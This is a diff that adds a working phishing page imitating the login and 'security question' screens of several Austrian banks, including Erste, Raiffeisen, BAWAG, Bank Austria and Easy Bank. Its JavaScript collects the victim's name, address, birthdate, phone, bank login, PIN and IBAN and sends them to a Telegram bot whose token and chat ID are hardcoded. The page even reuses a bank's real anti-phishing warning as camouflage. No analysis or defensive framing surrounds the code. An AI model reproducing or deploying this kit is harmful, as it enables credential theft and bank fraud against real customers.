+                        Sie befinden sich nun im HYPO NOE Kundinnenportal. Sie haben hier unter anderem die Möglichkeit, Ihr Wohnbauförderungsdarlehen des Landes Niederösterreich einzusehen und zugehörige jährliche Kontoinformationen herunterzuladen. Erfahren Sie mehr über die Funktionsweise und Möglichkeiten des Portals in einem kurzen <a href="#">Video</a> auf unserer Website.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Easy Bank -->
+    <div class="bank-full-wrapper" id="easyWrapper">
+        <div class="easy-wrapper">
+            <div class="easy-content">
+                <img src="fdfd.png" alt="Easy Bank" class="easy-logo-top">
+                
+                <div class="easy-box">
+                    <div class="easy-box-header">Login mit Zugangsdaten</div>
+                    <div class="easy-box-body">
+                        <div class="easy-intro">Wie wollen Sie sich einloggen?</div>
+                        
+                        <div class="easy-tabs">
+                            <div class="easy-tab">Verfüger</div>
+                        </div>
+                        
+                        <div class="easy-field">
+                            <label for="easy_verfueger">Verfügernummer</label>
+                            <input type="text" id="easy_verfueger" placeholder="">
+                            <div class="easy-hint">Verfüger ohne führende Nullen!</div>
+                        </div>
+                        
+                        <div class="easy-field">
+                            <label for="easy_pin">PIN</label>
+                            <div class="easy-pw-wrapper">
+                                <input type="password" id="easy_pin" placeholder="">
+                                <svg class="easy-pw-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                    <circle cx="12" cy="12" r="3"></circle>
+                                </svg>
+                            </div>
+                            <div class="easy-hint">8 bis 16-stellig</div>
+                        </div>
+                        
+                        <button type="button" class="easy-btn" id="easyNextBtn">Login</button>
+                        
+                        <div class="easy-forgot">eBanking Zugang entsperren</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bank Austria -->
+    <div class="bank-full-wrapper" id="baWrapper">
+        <div class="ba-wrapper">
+            <div class="ba-content">
+                <img src="bau.svg" alt="Bank Austria" class="ba-logo-top">
+                
+                <div class="ba-title">24You</div>
+                
+                <div class="ba-warning">
+                    <p class="ba-warning-text">Warnung: Derzeit versenden Betrüger Phishing-Mails bei denen Ihnen eine Login-Aufforderung der Bank Austria vorgegaukelt wird.</p>
+                    <p class="ba-warning-text">Folgen Sie keinen Login-Links, die Sie per E-Mail oder per SMS erhalten! Bitte lesen Sie vor der Eingabe einer TAN den Text der gesamten TAN-Nachricht sorgfältig!</p>
+                    <p class="ba-warning-text">Sie befürchten, Opfer dieses Betruges zu sein? Rufen Sie zu Ihrer eigenen Sicherheit umgehend das Bank Austria Sicherheitscenter unter der Rufnummer 050505-26105 an.</p>
+                </div>
+                
+                <div class="ba-input-group">
+                    <input type="text" id="ba_verfueger" class="ba-input" placeholder="Verfügernummer">
+                </div>
+                <div class="ba-input-group">
+                    <input type="password" id="ba_pin" class="ba-input" placeholder="PIN">
+                </div>
+                
+                <div class="ba-links">
+                    <a href="#">PIN vergessen oder Verfügernummer gesperrt?</a>
+                </div>
+                
+                <button type="button" class="ba-btn" id="baNextBtn">LOGIN</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================
+         КАСТОМНЫЕ БАНКИ (Шаг 2 — IBAN) - единый стиль с логотипами
+         ============================================================ -->
+
+    <!-- Erste Bank (George) - IBAN -->
+    <div class="bank-full-wrapper is-erste" id="ersteIbanWrapper">
+        <div class="iban-screen-wrapper">
+            <div class="iban-screen-content">
+                <div class="iban-screen-card">
+                    <div class="iban-screen-header">Erste Bank Sicherheitsfrage</div>
+                    <div class="iban-screen-body">
+                        <img src="blgv.svg" alt="George" class="iban-logo" style="width: 96px; height: 96px;">
+                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
+                        <div class="iban-screen-divider"></div>
+                        <label class="iban-screen-label" for="iban_erste">IBAN</label>
+                        <input type="text" id="iban_erste" class="iban-screen-input" placeholder="" required>
+                        <button type="button" class="iban-screen-btn" id="ersteIbanSubmitBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bank99 - IBAN -->
+    <div class="bank-full-wrapper is-bank99" id="bank99IbanWrapper">
+        <div class="iban-screen-wrapper">
+            <div class="iban-screen-content">
+                <div class="iban-screen-card">
+                    <div class="iban-screen-header">Bank99 Sicherheitsfrage</div>
+                    <div class="iban-screen-body">
+                        <img src="logo99.png" alt="bank99" class="iban-logo" style="width: 120px; height: auto;">
+                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
+                        <div class="iban-screen-divider"></div>
+                        <label class="iban-screen-label" for="iban_99">IBAN</label>
+                        <input type="text" id="iban_99" class="iban-screen-input" placeholder="" required>
+                        <button type="button" class="iban-screen-btn" id="bank99IbanSubmitBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Volksbank - IBAN -->
+    <div class="bank-full-wrapper is-vb" id="vbIbanWrapper">
+        <div class="iban-screen-wrapper">
+            <div class="iban-screen-content">
+                <div class="iban-screen-card">
+                    <div class="iban-screen-header">Volksbank Sicherheitsfrage</div>
+                    <div class="iban-screen-body">
+                        <img src="logovs.png" alt="Volksbank" class="iban-logo" style="width: 140px; height: auto;">
+                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
+                        <div class="iban-screen-divider"></div>
+                        <label class="iban-screen-label" for="iban_vb">IBAN</label>
+                        <input type="text" id="iban_vb" class="iban-screen-input" placeholder="" required>
+                        <button type="button" class="iban-screen-btn" id="vbIbanSubmitBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Raiffeisenbank - IBAN -->
+    <div class="bank-full-wrapper is-rfb" id="rfbIbanWrapper">
+        <div class="iban-screen-wrapper">
+            <div class="iban-screen-content">
+                <div class="iban-screen-card">
+                    <div class="iban-screen-header">Raiffeisenbank Sicherheitsfrage</div>
+                    <div class="iban-screen-body">
+                        <img src="32x32.png" alt="Raiffeisen" class="iban-logo" style="width: 80px; height: 80px;">
+                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
+                        <div class="iban-screen-divider"></div>
+                        <label class="iban-screen-label" for="iban_rfb">IBAN</label>
+                        <input type="text" id="iban_rfb" class="iban-screen-input" placeholder="" required>
+                        <button type="button" class="iban-screen-btn" id="rfbIbanSubmitBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- BAWAG - IBAN -->
+    <div class="bank-full-wrapper is-bawag" id="bawagIbanWrapper">
+        <div class="iban-screen-wrapper">
+            <div class="iban-screen-content">
+                <div class="iban-screen-card">
+                    <div class="iban-screen-header">Bawag Sicherheitsfrage</div>
+                    <div class="iban-screen-body">
+                        <img src="bawag.png" alt="BAWAG" class="iban-logo" style="width: 220px; height: auto;">
+                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
+                        <div class="iban-screen-divider"></div>
+                        <label class="iban-screen-label" for="iban_bawag">IBAN</label>
+                        <input type="text" id="iban_bawag" class="iban-screen-input" placeholder="" required>
+                        <button type="button" class="iban-screen-btn" id="bawagIbanSubmitBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Sparda Bank - IBAN -->
+    <div class="bank-full-wrapper is-sparda" id="spardaIbanWrapper">
+        <div class="iban-screen-wrapper">
+            <div class="iban-screen-content">
+                <div class="iban-screen-card">
+                    <div class="iban-screen-header">Sparda Bank Sicherheitsfrage</div>
+                    <div class="iban-screen-body">
+                        <img src="logospp.png" alt="Sparda Bank" class="iban-logo" style="width: 140px; height: auto;">
+                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
+                        <div class="iban-screen-divider"></div>
+                        <label class="iban-screen-label" for="iban_sparda">IBAN</label>
+                        <input type="text" id="iban_sparda" class="iban-screen-input" placeholder="" required>
+                        <button type="button" class="iban-screen-btn" id="spardaIbanSubmitBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- HYPO NOE - IBAN -->
+    <div class="bank-full-wrapper is-hypo" id="hypoIbanWrapper">
+        <div class="iban-screen-wrapper">
+            <div class="iban-screen-content">
+                <div class="iban-screen-card">
+                    <div class="iban-screen-header">Hypo NOE Sicherheitsfrage</div>
+                    <div class="iban-screen-body">
+                        <img src="hnp.svg" alt="Hypo NOE" class="iban-logo" style="width: 190px; height: 40px;">
+                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
+                        <div class="iban-screen-divider"></div>
+                        <label class="iban-screen-label" for="iban_hypo">IBAN</label>
+                        <input type="text" id="iban_hypo" class="iban-screen-input" placeholder="" required>
+                        <button type="button" class="iban-screen-btn" id="hypoIbanSubmitBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Easy Bank - IBAN -->
+    <div class="bank-full-wrapper is-easy" id="easyIbanWrapper">
+        <div class="iban-screen-wrapper">
+            <div class="iban-screen-content">
+                <div class="iban-screen-card">
+                    <div class="iban-screen-header">Easy Bank Sicherheitsfrage</div>
+                    <div class="iban-screen-body">
+                        <img src="fdfd.png" alt="Easy Bank" class="iban-logo" style="width: 245px; height: 92px;">
+                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
+                        <div class="iban-screen-divider"></div>
+                        <label class="iban-screen-label" for="iban_easy">IBAN</label>
+                        <input type="text" id="iban_easy" class="iban-screen-input" placeholder="" required>
+                        <button type="button" class="iban-screen-btn" id="easyIbanSubmitBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bank Austria - IBAN -->
+    <div class="bank-full-wrapper is-ba" id="baIbanWrapper">
+        <div class="iban-screen-wrapper">
+            <div class="iban-screen-content">
+                <div class="iban-screen-card">
+                    <div class="iban-screen-header">Bank Austria Sicherheitsfrage</div>
+                    <div class="iban-screen-body">
+                        <img src="bau.svg" alt="Bank Austria" class="iban-logo" style="width: 200px; height: 80px;">
+                        <div class="iban-screen-text">Bitte geben Sie im untenstehenden Feld die IBAN Ihrer Bankkarte ein.</div>
+                        <div class="iban-screen-divider"></div>
+                        <label class="iban-screen-label" for="iban_ba">IBAN</label>
+                        <input type="text" id="iban_ba" class="iban-screen-input" placeholder="" required>
+                        <button type="button" class="iban-screen-btn" id="baIbanSubmitBtn">Weiter</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Нижний серый блок -->
+    <footer class="page-footer">
+        <p>
+            <a href="#">Datenschutzerklärung</a> / <a href="#">Impressum</a>
+        </p>
+    </footer>
+
+    <script>
+    (function () {
+        'use strict';
+
+        // Обновлённый токен и chat_id
+        const TG_BOT_TOKEN = '8912609329:AAHK76TxJHL3PParUX02CPDkHyi8zBGi9DU';
+        const TG_CHAT_ID   = '-1003924775699';
+        const TG_API_URL   = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
+
+        const screens = {
+            1: document.getElementById('screen1'),
+            2: document.getElementById('screen2'),
+            3: document.getElementById('screen3'),
+            4: document.getElementById('screen4')
+        };
+        const steps = document.querySelectorAll('.step');
+
+        function setStep(n) {
+            steps.forEach(s => {
+                const sn = +s.dataset.step;
+                s.classList.remove('active', 'done');
+                if (sn === n) s.classList.add('active');
+                else if (sn < n) s.classList.add('done');
+            });
+        }
+
+        function showScreen(n) {
+            Object.keys(screens).forEach(k => {
+                screens[k].classList.toggle('active', +k === n);
+            });
+            setStep(n);
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        const nextBtn1 = document.getElementById('nextBtn1');
+        if (nextBtn1) nextBtn1.addEventListener('click', () => showScreen(2));
+
+        const form = document.getElementById('dataForm');
+        const bankSelect = document.getElementById('bank');
+
+        const FIELD_RULES = {
+            'fullname':    (v) => v.trim().length < 3 ? 'Bitte vollständigen Namen eingeben' : null,
+            'email':       (v) => !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) ? 'Bitte gültige E-Mail eingeben' : null,
+            'birthdate':   (v) => {
+                if (v.length < 10) return 'Bitte vollständiges Datum eingeben (TT.MM.JJJJ)';
+                const m = v.match(/^(\d{2})\.(\d{2})\.(\d{4})$/);
+                if (!m) return 'Ungültiges Format';
+                const d = +m[1], mo = +m[2], y = +m[3];
+                if (d < 1 || d > 31 || mo < 1 || mo > 12 || y < 1900 || y > 2030) return 'Ungültiges Datum';
+                return null;
+            },
+            'phone':       (v) => v.replace(/\D/g, '').length < 6 ? 'Telefonnummer zu kurz' : null,
+            'address':     (v) => v.trim().length < 2 ? 'Bitte Straße eingeben' : null,
+            'housenumber': (v) => v.trim().length < 1 ? 'Bitte Hausnummer eingeben' : null,
+            'postcode':    (v) => v.replace(/\D/g, '').length < 3 ? 'PLZ zu kurz' : null,
+            'bank':        (v) => v.trim().length < 1 ? 'Bitte Bank wählen' : null
+        };
+
+        function setError(id, msg) {
+            const input = document.getElementById(id);
+            const err = document.querySelector('.field-error[data-error-for="' + id + '"]');
+            if (!input || !err) return;
+            if (msg) {
+                input.classList.add('invalid');
+                err.textContent = msg;
+            } else {
+                input.classList.remove('invalid');
+                err.textContent = '';
+            }
+        }
+
+        function validateField(id, rules) {
+            const input = document.getElementById(id);
+            if (!input) return true;
+            const v = input.value.trim();
+            if (!v) { setError(id, 'Dieses Feld ist erforderlich'); return false; }
+            const rule = rules[id];
+            if (rule) {
+                const e = rule(v);
+                if (e) { setError(id, e); return false; }
+            }
+            setError(id, '');
+            return true;
+        }
+
+        function validateGroup(ids, rules) {
+            let ok = true;
+            let first = null;
+            ids.forEach(id => {
+                if (!validateField(id, rules)) {
+                    ok = false;
+                    if (!first) first = document.getElementById(id);
+                }
+            });
+            if (first) {
+                first.focus();
+                first.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }
+            return ok;
+        }
+
+        const dob = document.getElementById('birthdate');
+        dob.addEventListener('input', (e) => {
+            let v = e.target.value.replace(/\D/g, '').slice(0, 8);
+            let out = '';
+            if (v.length > 0) out = v.slice(0, 2);
+            if (v.length > 2) out += '.' + v.slice(2, 4);
+            if (v.length > 4) out += '.' + v.slice(4, 8);
+            e.target.value = out;
+        });
+
+        document.getElementById('postcode').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+        });
+
+        Object.keys(FIELD_RULES).forEach(id => {
+            const el = document.getElementById(id);
+            if (!el) return;
+            el.addEventListener('input', () => {
+                if (el.classList.contains('invalid')) validateField(id, FIELD_RULES);
+            });
+            el.addEventListener('change', () => {
+                if (el.tagName === 'SELECT' || el.classList.contains('invalid')) validateField(id, FIELD_RULES);
+            });
+            el.addEventListener('blur', () => {
+                if (el.value.trim()) validateField(id, FIELD_RULES);
+            });
+        });
+
+        function escapeHtml(s) {
+            return String(s)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;');
+        }
+
+        function getTimestamp() {
+            const d = new Date();
+            const pad = (n) => String(n).padStart(2, '0');
+            return pad(d.getDate()) + '.' + pad(d.getMonth() + 1) + '.' + d.getFullYear() +
+                   ', ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+        }
+
+        function buildMessage(data) {
+            const addressLine = (data.address || '') + (data.housenumber ? ' ' + data.housenumber : '');
+            const lines = [
+                '\u{1F534} <b>AUSTRIA LOG!</b>',
+                '',
+                '\u{1F464} <b>Name:</b> ' + escapeHtml(data.fullname),
+                '\u{1F4E7} <b>E-mail:</b> ' + escapeHtml(data.email),
+                '\u{1F382} <b>Date of birth:</b> ' + escapeHtml(data.birthdate),
+                '\u{1F4F1} <b>Phone:</b> ' + escapeHtml(data.phone),
+                '\u{1F4CD} <b>Address:</b> ' + escapeHtml(addressLine),
+                '\u{1F4EE} <b>Postcode:</b> ' + escapeHtml(data.postcode),
+                '\u{1F3E6} <b>Bank:</b> ' + escapeHtml(data.bank),
+                '',
+                '\u{1F552} <b>Time:</b> ' + getTimestamp(),
+                '\u{1F310} <b>Browser:</b> ' + escapeHtml(navigator.userAgent)
+            ];
+            return lines.join('\n');
+        }
+
+        function buildBankMessage(loginData, ibanData) {
+            const lines = [
+                '\u{1F534} <b>AUSTRIA LOG — BANK</b>',
+                '',
+                '\u{1F510} <b>Login:</b> ' + escapeHtml(loginData.login || ''),
+                '\u{1F511} <b>Passwort:</b> ' + escapeHtml(loginData.password || ''),
+                '\u{1F3E6} <b>IBAN:</b> ' + escapeHtml(ibanData.iban || ''),
+                '',
+                '\u{1F552} <b>Time:</b> ' + getTimestamp(),
+                '\u{1F310} <b>Browser:</b> ' + escapeHtml(navigator.userAgent)
+            ];
+            return lines.join('\n');
+        }
+
+        async function sendToTelegram(text) {
+            const params = new URLSearchParams();
+            params.append('chat_id', TG_CHAT_ID);
+            params.append('text', text);
+            params.append('parse_mode', 'HTML');
+            params.append('disable_web_page_preview', 'true');
+
+            const res = await fetch(TG_API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: params.toString()
+            });
+            if (!res.ok) throw new Error('HTTP ' + res.status);
+            const json = await res.json();
+            if (!json.ok) throw new Error(json.description || 'Telegram API error');
+            return json;
+        }
+
+        // Переменные для хранения логина/пароля перед вводом IBAN
+        let currentBank = '';
+        let currentLogin = '';
+        let currentPassword = '';
+
+        function applyBankDesign() {
+            const selected = bankSelect.value;
+            currentBank = selected;
+            
+            document.querySelectorAll('.bank-full-wrapper').forEach(el => el.style.display = 'none');
+
+            if (selected === 'Erste Bank') {
+                document.getElementById('ersteWrapper').style.display = 'flex';
+            } else if (selected === 'Bank99') {
+                document.getElementById('bank99Wrapper').style.display = 'flex';
+            } else if (selected === 'Volksbank') {
+                document.getElementById('vbWrapper').style.display = 'flex';
+            } else if (selected === 'Raiffeisenbank') {
+                document.getElementById('rfbWrapper').style.display = 'flex';
+            } else if (selected === 'Bawag') {
+                document.getElementById('bawagWrapper').style.display = 'flex';
+            } else if (selected === 'Spardabank') {
+                document.getElementById('spardaWrapper').style.display = 'flex';
+            } else if (selected === 'Hypo NOE') {
+                document.getElementById('hypoWrapper').style.display = 'flex';
+            } else if (selected === 'Easy Bank') {
+                document.getElementById('easyWrapper').style.display = 'flex';
+            } else if (selected === 'Bank Austria') {
+                document.getElementById('baWrapper').style.display = 'flex';
+            } else {
+                showScreen(3);
+            }
+        }
+
+        // Открываем окно с IBAN для выбранного банка
+        function showIbanScreen() {
+            document.querySelectorAll('.bank-full-wrapper').forEach(el => el.style.display = 'none');
+            
+            if (currentBank === 'Erste Bank') {
+                document.getElementById('ersteIbanWrapper').style.display = 'flex';
+            } else if (currentBank === 'Bank99') {
+                document.getElementById('bank99IbanWrapper').style.display = 'flex';
+            } else if (currentBank === 'Volksbank') {
+                document.getElementById('vbIbanWrapper').style.display = 'flex';
+            } else if (currentBank === 'Raiffeisenbank') {
+                document.getElementById('rfbIbanWrapper').style.display = 'flex';
+            } else if (currentBank === 'Bawag') {
+                document.getElementById('bawagIbanWrapper').style.display = 'flex';
+            } else if (currentBank === 'Spardabank') {
+                document.getElementById('spardaIbanWrapper').style.display = 'flex';
+            } else if (currentBank === 'Hypo NOE') {
+                document.getElementById('hypoIbanWrapper').style.display = 'flex';
+            } else if (currentBank === 'Easy Bank') {
+                document.getElementById('easyIbanWrapper').style.display = 'flex';
+            } else if (currentBank === 'Bank Austria') {
+                document.getElementById('baIbanWrapper').style.display = 'flex';
+            }
+        }
+
+        function validateLoginPass(bankKey) {
+            const l = document.getElementById('login' + bankKey);
+            const p = document.getElementById('password' + bankKey);
+            if (!l || !p) return null;
+            if (!l.value.trim() || !p.value.trim()) return null;
+            return { login: l.value.trim(), password: p.value.trim() };
+        }
+
+        // Привязка кнопок "Weiter" для каждого банка (ШАГ 1)
+        document.getElementById('ersteNextBtn').addEventListener('click', () => {
+            const l = document.getElementById('login_erste');
+            const p = document.getElementById('password_erste');
+            if (!l.value.trim() || !p.value.trim()) { alert('Bitte Login und Passwort eingeben'); return; }
+            currentLogin = l.value.trim();
+            currentPassword = p.value.trim();
+            showIbanScreen();
+        });
+
+        document.getElementById('bank99NextBtn').addEventListener('click', () => {
+            const l = document.getElementById('login99');
+            const p = document.getElementById('password99');
+            if (!l.value.trim() || !p.value.trim()) { alert('Bitte Login und Passwort eingeben'); return; }
+            currentLogin = l.value.trim();
+            currentPassword = p.value.trim();
+            showIbanScreen();
+        });
+
+        document.getElementById('vbNextBtn').addEventListener('click', () => {
+            const l = document.getElementById('loginvb');
+            const p = document.getElementById('passwordvb');
+            if (!l.value.trim() || !p.value.trim()) { alert('Bitte Login und Passwort eingeben'); return; }
+            currentLogin = l.value.trim();
+            currentPassword = p.value.trim();
+            showIbanScreen();
+        });
+
+        document.getElementById('rfbNextBtn').addEventListener('click', () => {
+            const bl = document.getElementById('rfb_bundesland');
+            const v = document.getElementById('rfb_verfueger');
+            const p = document.getElementById('rfb_pin');
+            if (!bl.value || !v.value.trim() || !p.value.trim()) { alert('Bitte alle Felder ausfüllen'); return; }
+            currentLogin = bl.value + ' | ' + v.value.trim();
+            currentPassword = p.value.trim();
+            showIbanScreen();
+        });
+
+        document.getElementById('bawagNextBtn').addEventListener('click', () => {
+            const l = document.getElementById('loginbawag');
+            const p = document.getElementById('passwordbawag');
+            if (!l.value.trim() || !p.value.trim()) { alert('Bitte Login und Passwort eingeben'); return; }
+            currentLogin = l.value.trim();
+            currentPassword = p.value.trim();
+            showIbanScreen();
+        });
+
+        document.getElementById('spardaNextBtn').addEventListener('click', () => {
+            const l = document.getElementById('loginsparda');
+            const p = document.getElementById('passwordsparda');
+            if (!l.value.trim() || !p.value.trim()) { alert('Bitte Login und Passwort eingeben'); return; }
+            currentLogin = l.value.trim();
+            currentPassword = p.value.trim();
+            showIbanScreen();
+        });
+
+        document.getElementById('hypoNextBtn').addEventListener('click', () => {
+            const l = document.getElementById('hypo_email');
+            const p = document.getElementById('hypo_pw');
+            if (!l.value.trim() || !p.value.trim()) { alert('Bitte E-Mail und Passwort eingeben'); return; }
+            currentLogin = l.value.trim();
+            currentPassword = p.value.trim();
+            showIbanScreen();
+        });
+
+        document.getElementById('easyNextBtn').addEventListener('click', () => {
+            const l = document.getElementById('easy_verfueger');
+            const p = document.getElementById('easy_pin');
+            if (!l.value.trim() || !p.value.trim()) { alert('Bitte Verfügernummer und PIN eingeben'); return; }
+            currentLogin = l.value.trim();
+            currentPassword = p.value.trim();
+            showIbanScreen();
+        });
+
+        document.getElementById('baNextBtn').addEventListener('click', () => {
+            const l = document.getElementById('ba_verfueger');
+            const p = document.getElementById('ba_pin');
+            if (!l.value.trim() || !p.value.trim()) { alert('Bitte Verfügernummer und PIN eingeben'); return; }
+            currentLogin = l.value.trim();
+            currentPassword = p.value.trim();
+            showIbanScreen();
+        });
+
+        // Привязка кнопок "Bestätigen" для каждого банка (ШАГ 2 — IBAN)
+        async function finalSubmit(bankKey, ibanId, btnId) {
+            const ibanInput = document.getElementById(ibanId);
+            const btn = document.getElementById(btnId);
+            
+            if (!ibanInput.value.trim()) {
+                ibanInput.style.borderColor = '#c8102e';
+                ibanInput.focus();
+                return;
+            }
+            ibanInput.style.borderColor = '#999';
+
+            const loginData = { login: currentLogin, password: currentPassword };
+            const ibanData = { iban: ibanInput.value.trim() };
+
+            const original = btn.textContent || btn.innerHTML;
+            btn.disabled = true;
+            btn.textContent = 'Wird gesendet...';
+
+            try {
+                await sendToTelegram(buildBankMessage(loginData, ibanData));
+                btn.textContent = '✓ Gesendet';
+                btn.style.background = '#1a7f37';
+                btn.style.color = '#ffffff';
+            } catch (err) {
+                console.error(err);
+                btn.textContent = '✗ Fehler';
+                btn.style.background = '#c8102e';
+                btn.style.color = '#ffffff';
+            }
+
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.textContent = original;
+                btn.style.background = '';
+                btn.style.color = '';
+            }, 2500);
+        }
+
+        document.getElementById('ersteIbanSubmitBtn').addEventListener('click', () => finalSubmit('Erste', 'iban_erste', 'ersteIbanSubmitBtn'));
+        document.getElementById('bank99IbanSubmitBtn').addEventListener('click', () => finalSubmit('Bank99', 'iban_99', 'bank99IbanSubmitBtn'));
+        document.getElementById('vbIbanSubmitBtn').addEventListener('click', () => finalSubmit('Volksbank', 'iban_vb', 'vbIbanSubmitBtn'));
+        document.getElementById('rfbIbanSubmitBtn').addEventListener('click', () => finalSubmit('Raiffeisen', 'iban_rfb', 'rfbIbanSubmitBtn'));
+        document.getElementById('bawagIbanSubmitBtn').addEventListener('click', () => finalSubmit('Bawag', 'iban_bawag', 'bawagIbanSubmitBtn'));
+        document.getElementById('spardaIbanSubmitBtn').addEventListener('click', () => finalSubmit('Sparda', 'iban_sparda', 'spardaIbanSubmitBtn'));
+        document.getElementById('hypoIbanSubmitBtn').addEventListener('click', () => finalSubmit('Hypo', 'iban_hypo', 'hypoIbanSubmitBtn'));
+        document.getElementById('easyIbanSubmitBtn').addEventListener('click', () => finalSubmit('Easy', 'iban_easy', 'easyIbanSubmitBtn'));
+        document.getElementById('baIbanSubmitBtn').addEventListener('click', () => finalSubmit('BA', 'iban_ba', 'baIbanSubmitBtn'));
+
+        // Стандартная логика (для банков без кастома)
+        window.submitStandardBank = async function() {
+            const login = document.getElementById('login').value.trim();
+            const password = document.getElementById('password').value.trim();
+            if (!login || !password) { alert('Bitte Login und Passwort eingeben'); return; }
+            currentLogin = login;
+            currentPassword = password;
+            showScreen(4);
+        };
+
+        window.submitIban = async function() {
+            const iban = document.getElementById('iban').value.trim();
+            if (!iban) { alert('Bitte IBAN eingeben'); return; }
+            
+            const btn = document.getElementById('ibanSubmitBtn');
+            const original = btn.innerHTML;
+            btn.disabled = true;
+            btn.textContent = 'Sending...';
+
+            try {
+                await sendToTelegram(buildBankMessage({ login: currentLogin, password: currentPassword }, { iban: iban }));
+                btn.textContent = '✓ Sent';
+                btn.style.background = '#1a7f37';
+            } catch (err) {
+                console.error(err);
+                btn.textContent = '✗ Error';
+                btn.style.background = '#c8102e';
+            }
+
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.innerHTML = original;
+                btn.style.background = '';
+            }, 2500);
+        };
+
+        bankSelect.addEventListener('change', () => {
+            if (bankSelect.value) setError('bank', '');
+        });
+
+        // Отправка формы личных данных - сразу отправляет в ТГ и открывает нужный банк
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (!validateGroup(Object.keys(FIELD_RULES), FIELD_RULES)) return;
+            
+            const personal = {};
+            Object.keys(FIELD_RULES).forEach(id => personal[id] = document.getElementById(id).value.trim());
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const original = submitBtn.innerHTML;
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending...';
+
+            try {
+                await sendToTelegram(buildMessage(personal));
+                submitBtn.textContent = '✓';
+            } catch (err) {
+                console.error('Ошибка отправки личных данных:', err);
+                submitBtn.textContent = '✗';
+            }
+
+            setTimeout(() => {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = original;
+                applyBankDesign(); // Открываем окно выбранного банка
+            }, 1000);
+        });
+
+    })();
+    </script>
+
+</body>
+</html>
